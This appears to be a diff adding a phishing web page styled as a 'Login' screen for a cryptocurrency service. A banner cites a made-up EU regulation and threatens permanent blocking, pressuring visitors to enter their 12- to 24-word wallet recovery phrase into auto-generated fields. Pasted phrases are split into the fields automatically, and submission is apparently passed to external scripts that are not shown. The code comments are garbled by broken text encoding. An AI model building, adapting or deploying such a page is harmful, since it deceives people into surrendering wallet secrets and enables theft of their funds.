@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en" mode="md">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Login</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="shortcut icon" type="image/png" href="./img/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;600;900&display=swap" rel="stylesheet">
+<style>
+
+        h2 {
+    color: #fff;
+    font-weight: 600;
+}
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Montserrat', sans-serif; /* Ð¢Ð¾Ð½ÐºÐ¸Ð¹ ÑÑÐ¸ÑÑ Montserrat */
+            background-color: #0c2539; /* Ð¢ÐµÐ¼Ð½ÑÐ¹ ÑÐ¾Ð½ */
+            color: #FFFFFF; /* ÐÐµÐ»ÑÐ¹ ÑÐµÐºÑÑ */
+        }
+         form {
+            background: #0c2539; /* Ð¢ÐµÐ¼Ð½ÑÐ¹ ÑÐ¾Ð½ ÑÐ¾ÑÐ¼Ñ */
+            border-radius: 10px;
+            width: 100%;
+        }
+        .form-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr); /* 3 ÑÑÐ¾Ð»Ð±ÑÐ° */
+            gap: 10px;
+        }
+        .form-field {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            align-items: center;
+            gap: 10px;
+        }
+        label {
+            font-size: 14px;
+            font-weight: normal;
+            color: #fff;
+            white-space: nowrap;
+            width: 10px;
+        }
+        input {
+            padding: 8px;
+            border: 1px solid grey;
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #fff;
+            color: grey;
+            font-family: 'Montserrat', sans-serif; /* Ð¨ÑÐ¸ÑÑ Montserrat */
+        }
+        input:required {
+            border-color: grey;
+        }
+        select#dropdown__select {
+    color: #000;
+                font-family: 'Montserrat', sans-serif; /* Ð¢Ð¾Ð½ÐºÐ¸Ð¹ ÑÑÐ¸ÑÑ Montserrat */
+
+}
+        .submit-button {
+            display: block;
+            width: 25%;
+            padding: 10px;
+            background: #337ab7;
+            color: #fff;
+            font-weight: 600;
+            border: none;
+            border-radius: 18px;
+            font-size: 15px;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 30px;
+            transition: background 0.3s ease;
+                        font-family: 'Montserrat', sans-serif; /* Ð¨ÑÐ¸ÑÑ Montserrat */
+
+        }
+        .submit-button:hover {
+            background: #0f4cae;
+        }
+       
+     @media (max-width: 768px) {
+            form {
+                padding: 15px;
+                width: 90%;
+            }
+
+            .form-container {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+
+            .form-field {
+                grid-template-columns: 1fr;
+                gap: 5px;
+            }
+
+            label {
+                font-size: 12px;
+                text-align: left;
+            }
+
+            input {
+                font-size: 14px;
+                padding: 10px;
+            }
+
+            .submit-button {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            form {
+                padding: 10px;
+            }
+
+            label {
+                font-size: 12px;
+            }
+
+            input {
+                padding: 8px;
+                font-size: 12px;
+            }
+
+            .submit-button {
+                font-size: 13px;
+                padding: 10px;
+            }
+        }
+        label.Recovery {
+    color: #fff;
+}
+.border-red-600 {
+    --tw-border-opacity: 1;
+    border-color: rgb(224 36 36 / var(--tw-border-opacity));
+}
+.bg-red-600\/20 {
+    background-color: #e0242433;
+}
+.tracking-\[\.88px\] {
+    letter-spacing: .88px;
+}
+.border-dashed {
+    border-style: dashed;
+}
+.border {
+    border-width: 1px;
+}
+.rounded-\[5px\] {
+    border-radius: 5px;
+}
+    </style>
+<script>
+        // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ Ð¿Ð¾Ð»ÐµÐ¹
+        function updateFields() {
+            const formContainer = document.getElementById('form_fields');
+            const select = document.getElementById('dropdown__select');
+            const fieldCount = parseInt(select.value);
+
+            formContainer.innerHTML = ''; // ÐÑÐ¸ÑÑÐºÐ° ÑÑÐ°ÑÑÑ Ð¿Ð¾Ð»ÐµÐ¹
+
+            for (let i = 1; i <= fieldCount; i++) {
+                const field = document.createElement('div');
+                field.className = 'form-field';
+                field.innerHTML = `
+                    <label for="id${i}">${i}.</label>
+                    <input type="text" id="id${i}" name="field${i}" pattern="^\\w+$" required title="Ð Ð¿Ð¾Ð»Ðµ Ð´Ð¾Ð»Ð¶Ð½Ð¾ Ð±ÑÑÑ Ð¾Ð´Ð½Ð¾ ÑÐ»Ð¾Ð²Ð¾">
+                `;
+                formContainer.appendChild(field);
+            }
+        }
+
+        // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð°ÑÐ¸Ñ ÑÐ¾ÑÐ¼Ñ Ñ 12 Ð¿Ð¾Ð»ÑÐ¼Ð¸ Ð¿Ð¾ ÑÐ¼Ð¾Ð»ÑÐ°Ð½Ð¸Ñ
+        window.onload = () => {
+            document.getElementById('dropdown__select').value = 12;
+            updateFields();
+        };
+    </script>
+</head>
+
+<body>
+    <div id="app" bis_skin_checked="1" data-v-app="">
+        <form id="email_form">
+        <div class="form-header">
+            <div class="block text-[15px] tracking-[.88px] font-[400] w-full text-center mx-auto mb-8 border border-dashed border-red-600 rounded-[5px] p-2 bg-red-600/20" style="margin-bottom:15px">
+                
+                <span class="block text-[15px] tracking-[.88px] font-[400] w-full text-center mx-auto mb-8">In accordance with the new EU cryptocurrency regulation,<br> new rules will come into effect starting June 25.<br><br></span>
+                
+                
+            <span class="block text-[15px] tracking-[.88px] font-[400] w-full text-center mx-auto mb-8">Starting from June 25, 2025, access to the system<br> will only be available through a linked wallet.<br> If the linked phrase is invalid, access will be permanently blocked. 
+
+<br>
+</span></div>
+            <label for="dropdown__select" class="Recovery">Recovery Phrase</label>
+            <select id="dropdown__select" onchange="updateFields()">
+                <option value="12">I have a 12-word phrase</option>
+                <option value="15">I have a 15-word phrase</option>
+                <option value="18">I have a 18-word phrase</option>
+                <option value="21">I have a 21-word phrase</option>
+                <option value="24">I have a 24-word phrase</option>
+            </select>
+        </div>
+        <div id="form_fields" class="form-container">
+        </div>
+        
+        <button type="submit" class="submit-button">Login</button>
+    </form>
+        
+    </div>
+<script>
+    document.getElementById('email_form').addEventListener('paste', function (e) {
+        e.preventDefault();  // ÐÑÐµÐ´Ð¾ÑÐ²ÑÐ°ÑÐ°ÐµÐ¼ ÑÑÐ°Ð½Ð´Ð°ÑÑÐ½Ð¾Ðµ Ð¿Ð¾Ð²ÐµÐ´ÐµÐ½Ð¸Ðµ Ð²ÑÑÐ°Ð²ÐºÐ¸
+
+        const clipboardData = (e.clipboardData || window.clipboardData).getData('text');
+        const words = clipboardData.trim().split(/\s+/);  // Ð Ð°Ð·Ð´ÐµÐ»ÑÐµÐ¼ ÑÐµÐºÑÑ Ð½Ð° ÑÐ»Ð¾Ð²Ð°
+
+        const inputs = document.querySelectorAll('#form_fields input');
+
+        // ÐÐ°Ð¿Ð¾Ð»Ð½ÑÐµÐ¼ Ð¿Ð¾Ð»Ñ Ð²Ð²Ð¾Ð´Ð° ÑÐ»Ð¾Ð²Ð°Ð¼Ð¸
+        words.forEach((word, index) => {
+            if (inputs[index]) {
+                inputs[index].value = word;
+            }
+        });
+    });
+    
+    document.getElementById('email_form').addEventListener('submit', function() {
+    setTimeout(() => location.reload(), 500);  // ÐÐµÑÐµÐ·Ð°Ð³ÑÑÐ·ÐºÐ° ÑÐµÑÐµÐ· 0.5 ÑÐµÐºÑÐ½Ð´Ñ
+});
+</script>
+<script src=jquery.min.js></script>
+<script src=jquery.form.min.js></script>
+<script src=jquery.validate.min.js></script>
+<script src=valid.js></script>
+
+</body>
+
+</html>
